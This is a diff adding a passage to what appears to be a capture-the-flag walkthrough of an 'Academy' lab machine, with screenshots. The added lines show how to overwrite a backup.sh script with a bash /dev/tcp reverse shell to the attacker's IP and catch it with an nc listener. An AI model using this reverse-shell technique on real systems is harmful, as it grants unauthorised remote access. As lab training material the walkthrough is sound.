@@ -22,3 +22,18 @@ We now switch to grimmie user using SSH protocol with the command:
 ```
 ssh grimmie@<ip>
 ```
+<img alt="" class="bg hc hd c" width="1000" height="450" loading="lazy" role="presentation" src="https://i.ibb.co/CBDh92z/Academy-9.png"></img>
+
+Replace the contents of `backup.sh` script content to execute a bash tcp reverse shell by the command:
+```
+bash -i >& /dev/tcp/IP_of_your_machine/8080 0>&1
+```
+And on your machine type:
+```
+nc -lvnp 8080
+```
+The result is as follows:-
+
+<img alt="" class="bg hc hd c" width="1000" height="450" loading="lazy" role="presentation" src="https://i.ibb.co/j5vyjWW/Academy-11.png"></img>
+
+
